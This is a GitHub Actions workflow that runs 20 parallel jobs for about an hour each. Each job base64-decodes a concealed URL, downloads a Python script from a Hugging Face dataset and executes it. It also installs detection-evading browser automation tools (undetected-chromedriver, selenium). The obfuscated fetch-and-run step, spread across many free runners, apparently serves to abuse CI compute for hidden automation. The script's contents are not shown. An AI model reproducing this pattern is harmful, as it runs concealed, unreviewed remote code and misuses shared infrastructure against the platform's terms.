name: Nebula Grid Runner Core

on:
  workflow_dispatch:

concurrency:
  group: nebula-core-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Watchdog: يراقب الوقت ويلغي التشغيل بعد 59 دقيقة
  # =================================================================
  grid-watchdog:
    name: "Watchdog Controller"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      WATCHDOG_TIMEOUT_SEC: 3540
    steps:
      - name: Initialize Watchdog
        run: |
          echo "[WATCHDOG] Initialized for run ID: ${{ github.run_id }}"
          echo "[WATCHDOG] Starting timer for ${WATCHDOG_TIMEOUT_SEC} seconds..."

          sleep "${WATCHDOG_TIMEOUT_SEC}"

          echo "[WATCHDOG] Timer threshold met. Sending abort signal."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[WATCHDOG] Abort request sent. Terminating all active tasks."

  # =================================================================
  # Worker Cluster: تنفيذ متوازي مكوّن من عقد مختلفة
  # =================================================================
  worker-cluster:
    name: "Node-${{ matrix.node_code }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_code: [A101, B102, C103, D104, E105, F106, G107, H108, I109, J110, K111, L112, M113, N114, O115, P116, Q117, R118, S119, T120]

    steps:
      # -----------------------------------------------------------------
      # الخطوة 1: تجهيز البيئة وتثبيت الأدوات الأساسية
      # -----------------------------------------------------------------
      - name: Setup System Environment
        run: |
          echo "[SETUP] Preparing node ${{ matrix.node_code }}..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # -----------------------------------------------------------------
      # الخطوة 2: فك تشفير الرابط وتحميل السكربت
      # -----------------------------------------------------------------
      - name: Fetch Core Script
        run: |
          echo "[FETCH] Decoding payload source address..."
          PAYLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$PAYLOAD_URL" -o core_runner.py
          echo "[FETCH] Core script downloaded successfully."

      # -----------------------------------------------------------------
      # الخطوة 3: تثبيت المكتبات المطلوبة
      # -----------------------------------------------------------------
      - name: Install Dependencies
        run: |
          echo "[DEPS] Installing Python dependencies..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # -----------------------------------------------------------------
      # الخطوة 4: تشغيل السكربت وإدارة فترة حياته
      # -----------------------------------------------------------------
      - name: Execute Core Script
        run: |
          echo ">> Executing process on Node-${{ matrix.node_code }}..."

          python3 core_runner.py &
          PROCESS_PID=$!

          echo ">> Process started with PID $PROCESS_PID. Lifetime cap: 3540 seconds."

          sleep 3540

          if kill -0 "$PROCESS_PID" 2>/dev/null; then
            echo ">> Max time reached. Force shutting down process PID $PROCESS_PID..."
            kill -9 "$PROCESS_PID"
            echo ">> Process terminated."
          else
            echo ">> Process finished execution naturally before timeout."
          fi
